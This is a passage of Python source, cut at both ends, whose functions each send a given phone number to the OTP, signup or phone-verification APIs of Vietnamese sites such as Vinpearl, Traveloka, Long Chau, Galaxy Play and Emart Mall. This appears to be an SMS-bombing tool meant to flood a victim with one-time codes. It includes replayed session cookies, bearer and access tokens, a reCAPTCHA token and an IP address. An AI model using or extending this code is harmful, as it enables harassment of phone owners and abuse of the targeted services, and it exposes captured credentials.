        "NID": "516=m23kKbAgVyPumABOs2jA5KEZlePYw8rsaylnN7ctK6PM5P8RiD86rDb1k2sht3iSVow9TO6q4ayCBwpIDuYlLTzQhO_2wB7tPZI_IIyIpZMFlPOxqNG5gzega3TWtWnKJTiOUFDioPKwNgCrhZS_c5w0ONM9N6otcDBSZX0KP9cnRlJlWkMMI721HarmYTJN8PDG-vJcHNfwrU2YPGya7ce8e7S8knn_KalXfqMQDAqP4KSZzm1kPXXqpBq1P7VlBrwSwsfptXkKjSCbzZMRXu4FKd25BeJjt-4PUBpu7gUfczN9g39HIzGLOwa1LEAIpkUIr1V5WxvlYgsh5rJdTvh79hNq7nmsE8x1o7YOFZq8qYL6NwF6F269PD_0ph8reFfEOKXBiY6D9wWyfcnJTlLdUKQXPWJGq-RRfk3N_gJBsJxr8KNjpQeTVmn5hw8a4zTmxajXYC0_h7lV_9Z1-xE-WDkafbd5fTCd79bzaanpXl2JqPwodasvNVurBVgIhOoezVvZSfN575fpXnproGI76-WjGerHpeclMV_za_q95eWFWDANW086uUyRkZVdpKuJdwrq5jXEscJ4ARITjbIxg_TN-0zTzYgaiFL59kSumiIkyHUZuL6VpT_B4tVzUgMyUK4pbtnHO2DERr5ifYf0B1UkNCze232RMS-vaeDmtThuW117gUeI2VuKPiR8Sp5tUYYYUq37GJnqb-NV1r44iBvJViRwQIHH0VB3F4dxK3vRLwqN6Af28VRcMyNlUVRpsVFUY06ch4YaJT0RxSyiLVf5_VKmrScCQ22gdfXReG7RMWG7sCigyRObEsSMSqCkjtkjksX4zbduEwguRMW1CwecSkwCUUzDd-yyr8TqEpnEnfuUJVFIJULJcH7IHSew3k5zf6BK-K_28Ll38WJfvQuL4Z4msEJWvD-J0XxCXZducRks3fKZxYSx4JUOqdrx_4yUgp3W5sAU1a5jhrJOFlGsDmZ1DeFjS_pV381147OeBnULHtUXLYqxUcP3bDHzwu5qxzR6-e2sYwHPINSyJYt3iEzwMl6iOcnCjVjZCvotXpfeuY671eMNVEOWlWqX2rlkhD8Y3mRUfzro-jhps9Zv-8LX6LJgIm46sJleFTLi--o_jmJNrjD93VYvUjwVx1ToC3PFfeKgyA_8gwt8-CI_DVJd2TBMN22hXGWgqjkhplTx60JW2a6BX6HaAA8D_VH5rc2EgZqFw7ESeRzNovQ6k9j7JCYpi7UjZ3iVgdvGBdRH31QbLaM9h72ztmikYt3NaVP4xXtkiVkJu4a_PO-uZaEiYxrl7Q1XCNgTiYpJZkov6SWSG3CvR_C6A_9XXiYBX_1V8Zn2mbWFK5y_9hmLb9WhsU8orXfXl0gM_lcTVxEE-oV21qoSVZSt0bspDzC5jYv17a5Bs2i6hLawKkS9KShQarJZ-DCvPBcBXowtM5zVlwLlFYgfBL7ABgkB1JIdRMRpHxho8to73EG7gbJxdbB2gVOJc6I4Na2MsnDae2nquSS9DG1bgXeeMOSUI9DAhSvQMaFHb21dQiM7nSTIDar2aFex",
        "__Secure-3PSIDTS": "sidts-CjEB4E2dkVEV3-CyqKbVdW39EkgpF6jyOY8fS6bjJe4zXS_a4eVaQSfB7yzvVl2XltBQEAA",
        "__Secure-3PSIDCC": "AKEyXzUhcNA5jbx4HcFOzZuf5xKqDCY7kIqWnUqPH9OcK2cznTN4DsqnB8N6mLK1KWOnhD42agc",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-protobuf",
        "dnt": "1",
        "origin": "https://www.google.com",
        "priority": "u=1, i",
        "referer": "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT&co=aHR0cHM6Ly9zcGFjZXQudm46NDQz&hl=vi&v=Xv-KF0LlBu_a0FJ9I5YSlX5m&size=invisible&cb=fo432ewf4lpx",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    params = {
        "k": "6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT",
    }
    data = '(6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT03AFcWeA5N20RmwugrYXllw1qNvjZjMw1YM6jNS1uLsQvHNfK7A7-mPD2jAUXtw00ffIH4keDhheR5uEx81NMRq49hMkqK4ks6D5bELOyxwUxFiGciBFSLlFS58zNR8CGGG9OX7rnBPoImKP1mpQXLlCtEym2HF0l84vS2zCwHZB03Mb3CMsDfY0ifAxmD56Wn6_y0wV9uOKCosGpaZsA1UfW8b6y5eWM848ISQFO5zZ8-uWrbA3I570xFnLpyweGdBxV5EhEvUmRFAew8ujF714EYjsfmwwsHFpfVf8jkhrkdU94cfJSCdZ2CCDMybnf3qYQmCOFJbgGD8EgmJoL_hBbkbzxEpPf2vsdl3OdqOrpiwSUz2_wPPxTnh7Ff3XQfA2oGy6971ah6aYNo2wq6H15rX32WOl9vsPMW0bzEShwDEG9UHoBVXNxVzwJEiMrTtVDbFT9zcHsrrx_9VWQfeKG3F6Ls6iUmk_af7kH41i-teLcl4_BiIyv9w_u2rLFSS7zIA-qWOm01tDb36oyyyDmKDJ-CPN4UW-dbwT8nHRDVG5MscfUy-PBByzgX60kMvbPVXiCUjsOcW-m-xAobKW37HtuFzkKQTwWSdLYBQwqtUXjMiUPj1UZEH5qkRCnSlnNxcgZRe4ZgG2jKwXnVLiQFpgkF9rfsPJVTv1aBRqz3JM3K__-ZgbpbUqRXZKlCenebNn4tPIANEDS9TaGM4umKtjPo20jnE7CbZ7Zk2IfR9MXb7uDFskqB-s15h4zX3875Y11fYqj81Ao4Es8GrSe15YuazIPc8VGvRIFqBUilksOqRBDTfK-3LM8fTtWpSUthBxVEqaLKa18ull1vabRBl24TsA82pUjb2WEjTG3nYdTn5iQST913rlHQMDJ-w_PvuKm1nj7pW0vUcoasNW2vjmciOUEdKqr4zVAlFxPHLWq7Rsz3qau4Xd2hCby56gM4T9sH1xxX6_yH56izqQfqgr7M8ekM-AviEXnGz_HXwZBwNkyHXwnEoYbRwn4yFszTm2GTgpJo8UJr8H4TvrEX7c2dny0NEtsI--yGBgGzms7gOjnx70aiaqdWidOfPOfKs95mU9HI_UG502624YTzh7YGL0d9knjdXAJ6di23Ftf9qtaKpOwIwHJFHHjONZ6IHu5vDpaaCxUwCHIqxFgKS7XNuXH8H0-swLtiRD2A0HP01lbCGubHS3qebLy9u77NmzIEUBPJ3m6NloU52JGxupdPSIOVsQM6W-cQU36YEwXR-Ecw9YaSRzfOBKSqP_WE0NEuZ5orXvnM9a310MUccYpqcVL1YIwRSS0t0Mn4XTMCyA7D21yca1uOooGVsqPddCr4GmOBzCCGsbYmgnVWKGlQFJ_EeJMtLA4HBvp-bUThZE3H0tJL6YGb5EU9zvpqphoneNeG8BmVgb2wCJDW3qDXO-0rbUCqYJY6sahGQ0sfm3dJN5zHOqAxhuMdfHvQqg5-q5WkNGMXUyMDALbXwW1IAqqdpHPmk7hGuu6d3pLfwNygJsirGHSxiGK0WBiyJUMtNPyRQAzX4JFd5zV5ff71tDpNjN4Q\x1a\x18Xv-KF0LlBu_a0FJ9I5YSlX5m"E\bð\x01\x18\x01*>\b\b\x01\x10Õ\x01\x18ù\x02\b\b\x02\x10¬\x8a\x02\x18:\x0e\b\x04\x10ç\x8a\x02\x18ù\x01*\x03\x10¸`\b\b\x02\x10\x93\x05\x18X\x0e\b\x04\x10ý\x93\x05\x18\x96\x01*\x03\x10»n'.encode()
    response = requests.post(
        "https://www.google.com/recaptcha/api2/clr",
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2YThmYjYyNGZjMmJjMTk4MGNjMmQwYyIsInRva2VuSWQiOiI2NmE4ZmI2MjRmYzJiYzE5ODBjYzJkMmQiLCJpYXQiOjE3MjIzNTA0MzR9.aF4K1s9PlYsEm02V_TIeyCwkdDVdol1ZxcbokSQekYA",
        "captchat": "03AFcWeA6FD9EelBdsrVKHbdBJeFirlLDqs6uUyjoSlEpOPu0kW1MpuxZq0WIDH3ZG2BNcm-geCeDFoN_ttxSy_fri8OhUZyNBztp-bQIKX3Nkxy8DTI23SIvXiY4deERRTn648ujmGof9n64xZPqqszck0WxmJDoVR302TlgZRffLW98h06B-G5OxSQazLtC0Sp1BrxwnRxZ8QqY-hFZJs622LIW7iHOdEu-szSTW8zfXKx34bAQULS9zs2LfL7u7V8p1U4TNOjm6oQy1O2L3_i4sZAgUPl64LEKDX5nGwP6G-622G99MlF-jys_iWxxBaGJJjR_XrCRiYy_S2MmHPiR1vmHYU6XhK3d3LemE1vZm5ZTGXT1kaHt6PoqrRYkq7x7BFy8i5_I-e3WhKc4uRF6ZTve35n-iR8TpbuUsWCTX05ofVz6HTliRwcH_UITx4CHovH51Fuf0ko9Q5PFdevOieOLMIH-txiPmaFbTEdo-7lXQ8uOvilc5Q7lMSKMIPqwKW73NEtUHgX56vCv6stbOIUeTp83n3oDcTi33WBnQhtPbqt2CXdmheoPB8bXy0tNPE4hsNTXEgdegwPzgZVe5Mt_m_AdTJYj9tZTi6NHKbzMytlt8LVhVW9PQyvaH6RyDznWp4sP5ggOQTwdy6CRieWf5S10IxlgEAI2Jfx43OxrWA_bc4X6F4JxOBSE7feyIbXDHpOQYNa7rMwrPbELE9YQVJS6RlUPOAnol0_qb0ez6Ajx-rF8QzBKphGaiOJsqYfADpVQluBkQVrLsGFUbh_XlvI8TUtfJzNKOFe7o0rXqOjfdVC8uRqPZY1fbS9QT7TlJVfXdfDBKlHLw3E5plm3-5zZIAyDMQFr8GJLgRgnsCAp3Qf0im-wjRQSONR1MwBumNho2MH039zwiDgVWc50BqFiCvhhsSdxhz_gMjAjvM_TDawV8PyAxesgrDRKzrUA3A4qFYxDK8dPKOd5MQt6wGn7ZmmbkLC2cfBK5P7AKiMynlHm07P_b_T1eCyDl_NvcVsGF9p9OlE1jx7pkqIf2dT6ZLIS467Sk_XgjbG4hZy17520iK6AntQheXkfyhKxAEUrL06_VlU0cpSupjCw2tlaAMMefkZOxZYP0g9LHKMe2DgT5hPwyJAXwbUlQagul4_mI2aWnxRh4Nzrpweqa8QrM2HpVxZtkrBGYko5lmw3-fiUTvsA-QzX6MVf_q1Ltzw8Un-YdZTEIM0ZxZkTvAdpYyDKSrjR9ZVOjHK7qFhM0VdtmiUXHccTsrv88Y_UJbDkOaHHf7GfcwPBnwDdflVRKsllc2rRTpxdNI-ZwnDBHW0_2t2q8XPR0sTNea_cAl8Luvf95e--WWkVN70MUXq9a5ruwzFRvMS8EHz1VIicMd3OloLnO0zdOZ-bcifucDJD1MSJ_lCj1KdSs4Uh5YYv2iLdd_F5xS8_rupL4_2mtE3t4YXqwqmGMRkIUriEtCT9KwT9YSR2JMeBRPMm9LAyiWvNhMb4GNE0wYgKpWMtFGk0n7vUL2d4C_HXvm4HYecb56mPFqOlfUVxFVnuyHVRIDZXcGgQpPnbck3Gj-hM859anXjlkTQS_iEFkgv1odXZw0W6I9HxkXaAzsfPQF-sZAQsG1a2AeS_9tt9fuZdSz5_0L2Mdwd-Nx8laf77R6pr2G4AwoaLxc3v6PfS9lUh5L5DprhCUftJVWcbr4x_SBeIl_cv_E0wE1TP0kp-ZlMZ0ENFnDebQiGabeVZMIhpNIXT9Z_G5LOGKr5UOCkIWUsisZH1WPz0bXfEKYB2VxQVzcJe0kAoJj_71CRkeWFdLxGiC0hhorobwC0gx5GXkb_kBKrCxKzpE4FVANQIBUrbsx3a5enmbdd06UUrnfHQstTUE_YSLkUY1iZvMqHUM3gG74mhS71c0-BcEMisBfAI_UiLKaBTUdS_nOMW8f8QsN4AZxO_Es67NDYIy65fv-s3aXyo2J5EFo3pBfSDFhpZR",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://spacet.vn",
        "priority": "u=1, i",
        "referer": "https://spacet.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-requested-with": "XMLHttpRequest",
    }
    json_data = {
        "phone": phone,
    }
    response = requests.post(
        "https://api.spacet.vn/www/user/phone",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_vinpearl(phone):
    cookies = {
        "__cf_bm": "ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw",
        "__cfruid": "3f11778af16256a63eb265af0f726daceeb866de-1722350965",
    }
    headers = {
        "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "dnt": "1",
        "priority": "i",
        "referer": "https://booking.vinpearl.com/vi/login-vpt?callback=vinpearl.com/auth0/sso?redirectUrl=https://vinpearl.com/vi/bo-tui-16-dia-diem-du-lich-ha-long-lam-say-long-du-khach",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "image",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    response = requests.get(
        "https://booking.vinpearl.com/static/media/otp_lock.26ac1e3e.svg",
        cookies=cookies,
        headers=headers,
    )
    headers = {
        "accept": "application/json",
        "accept-language": "vi-VN",
        "access-control-allow-headers": "Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers",
        "authorization": "Bearer undefined",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://booking.vinpearl.com",
        "priority": "u=1, i",
        "referer": "https://booking.vinpearl.com/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-display-currency": "VND",
    }
    json_data = {
        "channel": "vpt",
        "username": phone,
        "type": 1,
        "OtpChannel": 1,
    }
    response = requests.post(
        "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
        headers=headers,
        json=json_data,
    )
def call_traveloka(phone):
    if phone.startswith("09"):
        phone = "+84" + phone[1:]
    cookies = {
        "tv-repeat-visit": "true",
        "countryCode": "VN",
        "tv_user": '{"authorizationLevel":100,"id":null}',
        "aws-waf-token": "98d9a3ce-74ae-4c55-9bc7-7f7bfd38eb33:AAoAv+Nn46QoAAAA:gvxS6OK/WD3sgvZHozCEooVHTXFGAse4BHwX3duvO+1ES7UfgyxW6JHZw/k60EUGp/zHOcObgnYj0450R3SsunEzxE12r6B4nqNXb12qrlWT68DMtNKLE+LXTcI/ssNVkL0bTzMBfZy87typHsUqku8II9EBQ9+yrb4IwvRLQJ+dmRBmjBXZEV/Jnj6ME53ngtZW+cIk0vb0tOi38a7mSK9uZw==",
        "tvl": "Pp2fiNmPN9ehu7LHMwNpGSSbQ0zEW8yNJGNrzEA+b5Tu/0QLSpEb9I15NcVASi6xJr7DpGrOW4FLV8SlNNIS5eciWJ9DfTh0Rbclt/MUEHKt6Liu/yDwgdnfnNkZKsVz21+N16DTS1sA51j3T1hUeUkdZnQ4Fql7MYzqG7/ae3YyBZr5Ks3dvYv7j7osaueb96QnQa/Hzd7of7MTXYnzZbl0A9Yi9G3pWvWsmPXbQonHXb1qNRSCi5KVUWjjYHkcHvCLnDOGI3o=~djAy",
        "tvs": "kOOPm9nR1+er1b8TFCAUgDLEIZ3VFBFIPFWJkFnDJ4stbii+OyDY47kN6Azp58gWhUyymih08uHGt5lhT4PvuwxDSvjXKwvZ/02k2VjAe65GOakasngrQF4EGjnnw3DDuoETUig5QjfQDfgEftAjG85pM6p6TvSU31SizW/I9caAmXpcw3LUVuyTt78y12sZZpeW+OUayg==~djAy",
        "_dd_s": "rum=0&expire=1722352252222&logs=1&id=a1a90fe7-fce8-48b0-9100-5f789ab941af&created=1722351314461",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://www.traveloka.com",
        "priority": "u=1, i",
        "referer": "https://www.traveloka.com/vi-vn/explore/destination/kinh-nghiem-du-lich-ha-long-acc/148029",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-domain": "user",
        "x-route-prefix": "vi-vn",
    }
    json_data = {
        "fields": [],
        "data": {
            "userLoginMethod": "PN",
            "username": phone,
        },
        "clientInterface": "desktop",
    }
    response = requests.post(
        "https://www.traveloka.com/api/v2/user/signup",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_dongplus(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi",
        "content-type": "application/json",
        "dnt": "1",
        "ert": "DP:f9adae3150090780ee8cfac00fc7cc13",
        "origin": "https://dongplus.vn",
        "priority": "u=1, i",
        "referer": "https://dongplus.vn/user/registration/reg1",
        "rt": "2024-07-30T22:25:19+07:00",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "mobile_phone": phone,
    }
    response = requests.post(
        "https://api.dongplus.vn/api/v2/user/check-phone",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_longchau(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "access-control-allow-origin": "*",
        "content-type": "application/json",
        "dnt": "1",
        "order-channel": "1",
        "origin": "https://nhathuoclongchau.com.vn",
        "priority": "u=1, i",
        "referer": "https://nhathuoclongchau.com.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-channel": "EStore",
    }
    json_data = {
        "phoneNumber": phone,
        "otpType": 0,
        "fromSys": "WEBKHLC",
    }
    response = requests.post(
        "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
        headers=headers,
        json=json_data,
    )
def call_longchau1(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "access-control-allow-origin": "*",
        "content-type": "application/json",
        "dnt": "1",
        "order-channel": "1",
        "origin": "https://nhathuoclongchau.com.vn",
        "priority": "u=1, i",
        "referer": "https://nhathuoclongchau.com.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-channel": "EStore",
    }
    json_data = {
        "phoneNumber": phone,
        "otpType": 1,
        "fromSys": "WEBKHLC",
    }
    response = requests.post(
        "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
        headers=headers,
        json=json_data,
    )
def call_galaxyplay(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi",
        "access-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk",
        "dnt": "1",
        "origin": "https://galaxyplay.vn",
        "priority": "u=1, i",
        "referer": "https://galaxyplay.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-requested-with": "XMLHttpRequest",
    }
    params = {
        "phone": phone,
    }
    response = requests.post(
        "https://api.glxplay.io/account/phone/checkPhoneOnly",
        params=params,
        headers=headers,
    )
    headers = {
        "accept": "*/*",
        "accept-language": "vi",
        "access-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk",
        "content-type": "application/json;charset=UTF-8",
        "dnt": "1",
        "origin": "https://galaxyplay.vn",
        "priority": "u=1, i",
        "referer": "https://galaxyplay.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-requested-with": "XMLHttpRequest",
    }
    json_data = {
        "app_category": "app",
        "app_version": "2.0.0",
        "app_env": "prod",
        "session_id": "03ffa1f4-5695-e773-d0bc-de3b8fcf226d",
        "client_ip": "14.170.8.116",
        "jwt_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk",
        "client_timestamp": "1722356171541",
        "model_name": "Windows",
        "user_id": "",
        "client_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "event_category": "account",
        "on_screen": "login",
        "from_screen": "landing_page",
        "event_action": "click",
        "direct_object_type": "button",
        "direct_object_id": "submit_phone_number",
        "direct_object_property": phone,
        "indirect_object_type": "",
        "indirect_object_id": "",
        "indirect_object_property": "",
        "context_format": "",
        "profile_id": "",
        "profile_name": "",
        "profile_kid_mode": "0",
        "context_value": {
            "is_new_user": 1,
            "new_lp": 0,
            "testing_tag": [],
        },
        "mkt_source": "",
        "mkt_campaign": "",
        "mkt_medium": "",
        "mkt_term": "",
        "mkt_content": "",
    }
    response = requests.post(
        "https://tracker.glxplay.io/v1/event",
        headers=headers,
        json=json_data,
        timeout=10,
    )
    headers = {
        "accept": "*/*",
        "accept-language": "vi",
        "access-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk",
        "dnt": "1",
        "origin": "https://galaxyplay.vn",
        "priority": "u=1, i",
        "referer": "https://galaxyplay.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-requested-with": "XMLHttpRequest",
    }
    params = {
        "phone": phone,
    }
    response = requests.post(
        "https://api.glxplay.io/account/phone/verify", params=params, headers=headers
    )
def call_emartmall(phone):
    cookies = {
        "emartsess": "30rqcrlv76osg3ghra9qfnrt43",
        "default": "7405d27b94c61015ad400e65ba",
        "language": "vietn",
        "currency": "VND",
        "emartCookie": "Y",
    }
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "DNT": "1",
        "Origin": "https://emartmall.com.vn",
        "Referer": "https://emartmall.com.vn/index.php?route=account/register",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "mobile": phone,
    }
    response = requests.post(
        "https://emartmall.com.vn/index.php?route=account/register/smsRegister",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_ahamove(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi",
        "content-type": "application/json;charset=UTF-8",
        "dnt": "1",
        "origin": "https://app.ahamove.com",
        "priority": "u=1, i",
